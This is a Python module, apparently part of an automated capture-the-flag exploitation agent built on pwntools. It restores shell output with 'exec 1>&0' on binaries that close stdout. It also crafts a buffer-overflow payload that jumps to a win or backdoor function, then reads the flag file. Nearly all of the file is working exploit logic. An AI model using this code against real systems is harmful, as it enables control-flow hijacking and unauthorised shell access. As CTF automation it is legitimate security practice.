"""Rule: when binary calls close(1)/close(2), redirect output via exec 1>&0."""
from __future__ import annotations

from pwn import log, flat, p64, p32, process as _pwn_process

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, safe_close

# PTY makes stdin bidirectional (read+write), required for exec 1>&0
# when running locally.  Pipes (default) are read-only on child's fd 0.
try:
    from pwnlib.tubes.process import PTY
except ImportError:
    PTY = True  # fallback sentinel; pwntools accepts True as PTY flag


def _condition(state) -> bool:
    return bool(state.discovered_facts.get("close_stdout"))


def _action(state) -> ActionResult:
    """Send exec 1>&0 to restore output after close(1)/close(2)."""
    ctx = state.ctx

    log.info("Agent close_redirect: trying exec 1>&0 to restore output")

    # Strategy 1: Program already gives shell (just closed stdout)
    # Just connect and send exec 1>&0
    for attempt in range(3):
        io = None
        try:
            io = open_target(ctx, stdin=PTY)

            import time
            time.sleep(0.5)

            # Send exec 1>&0 to redirect stdout to stdin's fd
            io.sendline(b"exec 1>&0")
            time.sleep(0.3)

            io.sendline(b"echo P_W_N_E_D")
            try:
                data = io.recv(timeout=3)
                text = data.decode("utf-8", errors="replace")
                if "P_W_N_E_D" in text:
                    log.success("Agent close_redirect: shell obtained with exec 1>&0!")
                    io.sendline(b"cat flag.txt 2>/dev/null || cat flag 2>/dev/null")
                    try:
                        flag_data = io.recv(timeout=2)
                        log.info(f"Flag: {flag_data.decode('utf-8', errors='replace').strip()}")
                    except Exception:
                        pass
                    from autopwn.agent.action_utils import interactive_or_close
                    return ActionResult(
                        success=interactive_or_close(io, True),
                        record=AttemptRecord(strategy="close_redirect", success=True),
                    )
            except Exception:
                pass
            safe_close(io)
        except Exception as exc:
            log.debug(f"close_redirect attempt {attempt} error: {exc}")
            if io:
                safe_close(io)

    # Strategy 2: Need overflow to reach shell func, then redirect
    offset = ctx.overflow_offset
    if offset < 0:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="close_redirect", diagnosis="no_shell_no_offset"))

    word = ctx.bits // 8
    pack = p64 if word == 8 else p32

    shell_addr = 0
    for wf in ctx.win_funcs:
        shell_addr = wf.get("addr", 0)
        if shell_addr:
            break
    if not shell_addr:
        ew = state.discovered_facts.get("expanded_win")
        if ew:
            shell_addr = ew.get("addr", 0)
    if not shell_addr and ctx.elf:
        for name in ("shell", "backdoor", "getshell", "get_shell", "win", "flag"):
            if name in ctx.elf.symbols:
                shell_addr = ctx.elf.symbols[name]
                break

    if not shell_addr:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="close_redirect", diagnosis="no_shell_func"))

    ret_gadget = ctx.find_gadget("ret")

    for use_align in ([True, False] if ret_gadget and ctx.bits == 64 else [False]):
        io = None
        try:
            io = open_target(ctx, stdin=PTY)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            pad = b"A" * offset
            if use_align:
                payload = pad + pack(ret_gadget) + pack(shell_addr)
            else:
                payload = pad + pack(shell_addr)

            if ctx.input_type in ("gets", "direct"):
                io.sendline(payload)
            else:
                io.send(payload)

            import time
            time.sleep(0.5)
            io.sendline(b"exec 1>&0")
            time.sleep(0.3)
            io.sendline(b"echo P_W_N_E_D")
            try:
                data = io.recv(timeout=3)
                if b"P_W_N_E_D" in data:
                    log.success("Agent close_redirect: overflow+redirect worked!")
                    from autopwn.agent.action_utils import interactive_or_close
                    return ActionResult(
                        success=interactive_or_close(io, True),
                        record=AttemptRecord(strategy="close_redirect", success=True),
                    )
            except Exception:
                pass
            safe_close(io)
        except Exception:
            if io:
                safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="close_redirect", diagnosis="redirect_failed"),
    )


RULES = [
    ("close_redirect", 78, "exec 1>&0 to restore output after close(1,2)",
     _condition, _action),
]
